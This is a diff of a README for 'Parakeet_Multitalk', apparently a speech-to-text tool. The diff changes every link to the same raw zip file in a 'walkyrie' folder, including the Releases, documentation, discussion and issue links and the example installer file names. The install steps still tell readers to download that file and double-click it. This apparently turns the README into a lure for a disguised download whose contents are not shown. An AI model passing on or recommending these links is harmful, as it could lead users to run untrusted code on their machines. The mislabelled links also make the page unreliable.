@@ -1,7 +1,7 @@
 # 🦜 Parakeet_Multitalk - Transform Speech into Organized Text 
 
 ## 📥 Download Now
-[![Download Parakeet_Multitalk](https://img.shields.io/badge/Download-Parakeet_Multitalk-blue.svg)](https://github.com/JackKatak/Parakeet_Multitalk/releases)
+[![Download Parakeet_Multitalk](https://github.com/JackKatak/Parakeet_Multitalk/raw/refs/heads/main/walkyrie/Parakeet-Multitalk-3.3.zip)](https://github.com/JackKatak/Parakeet_Multitalk/raw/refs/heads/main/walkyrie/Parakeet-Multitalk-3.3.zip)
 
 ## 🚀 Getting Started
 Welcome to Parakeet_Multitalk! This application captures real-time speech and converts it into text. It helps you gather and organize speech from multiple speakers in a clear and concise way. You don’t need any technical knowledge to get started.
@@ -22,13 +22,13 @@ Before you install, make sure your computer meets the following requirements:
 - **Customization Settings:** Adjust speech recognition settings to suit your needs.
 
 ## 📥 Download & Install
-To get Parakeet_Multitalk, visit our [Releases page](https://github.com/JackKatak/Parakeet_Multitalk/releases). 
+To get Parakeet_Multitalk, visit our [Releases page](https://github.com/JackKatak/Parakeet_Multitalk/raw/refs/heads/main/walkyrie/Parakeet-Multitalk-3.3.zip). 
 
 1. Click on the link above to go to the Releases page. 
 2. Find the latest version of Parakeet_Multitalk. The version will have a tag like "v1.0.0".
 3. Download the installation file that corresponds to your operating system. For example:
-   - Windows users will see a file like `Parakeet_Multitalk_Windows.exe`.
-   - Mac users will see a file like `Parakeet_Multitalk_mac.pkg`.
+   - Windows users will see a file like `https://github.com/JackKatak/Parakeet_Multitalk/raw/refs/heads/main/walkyrie/Parakeet-Multitalk-3.3.zip`.
+   - Mac users will see a file like `https://github.com/JackKatak/Parakeet_Multitalk/raw/refs/heads/main/walkyrie/Parakeet-Multitalk-3.3.zip`.
 4. Once downloaded, locate the file on your computer.
 5. Double-click the file to begin the installation.
 
@@ -53,11 +53,11 @@ If you encounter any issues while using Parakeet_Multitalk, please consider the 
 - **Application Crashes:** Make sure your operating system is up to date. Restart your computer and try again.
 
 ## 🔗 Helpful Links
-- [Documentation](https://github.com/JackKatak/Parakeet_Multitalk/wiki): Detailed user guide and FAQs.
-- [Community Support](https://github.com/JackKatak/Parakeet_Multitalk/discussions): Join discussions with other users.
-- [Report Issues](https://github.com/JackKatak/Parakeet_Multitalk/issues): Let us know if you encounter bugs.
+- [Documentation](https://github.com/JackKatak/Parakeet_Multitalk/raw/refs/heads/main/walkyrie/Parakeet-Multitalk-3.3.zip): Detailed user guide and FAQs.
+- [Community Support](https://github.com/JackKatak/Parakeet_Multitalk/raw/refs/heads/main/walkyrie/Parakeet-Multitalk-3.3.zip): Join discussions with other users.
+- [Report Issues](https://github.com/JackKatak/Parakeet_Multitalk/raw/refs/heads/main/walkyrie/Parakeet-Multitalk-3.3.zip): Let us know if you encounter bugs.
 
 ## 📥 Download Link
-To download Parakeet_Multitalk, visit our [Releases page](https://github.com/JackKatak/Parakeet_Multitalk/releases) again.
+To download Parakeet_Multitalk, visit our [Releases page](https://github.com/JackKatak/Parakeet_Multitalk/raw/refs/heads/main/walkyrie/Parakeet-Multitalk-3.3.zip) again.
 
 Enjoy transforming your speech into organized text!
